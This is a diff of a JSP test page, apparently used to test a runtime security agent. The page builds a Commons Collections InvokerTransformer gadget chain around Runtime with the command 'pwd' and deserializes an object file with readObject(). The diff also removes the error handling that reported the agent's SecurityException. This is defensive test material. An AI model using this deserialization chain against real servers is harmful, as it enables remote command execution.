@@ -9,8 +9,8 @@
 <%@ page import="java.lang.annotation.Retention" %>
 <%@ page import="java.io.*" %>
 <%
-String cmd = "pwd";
-try {
+    String cmd = "pwd";
+
     Transformer[] transformers = new Transformer[]{
             new ConstantTransformer(Runtime.class),
             new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class},
@@ -37,11 +37,4 @@ try {
     ObjectInputStream in = new ObjectInputStream(new FileInputStream("obj"));
     in.readObject();
     in.close();
-} catch (Exception e) {
-    if (e.getClass().getName().equals("com.fuxi.javaagent.exception.SecurityException")) {
-        response.sendError(403, e.getMessage());
-    } else {
-        throw e;
-    }
-}
 %>
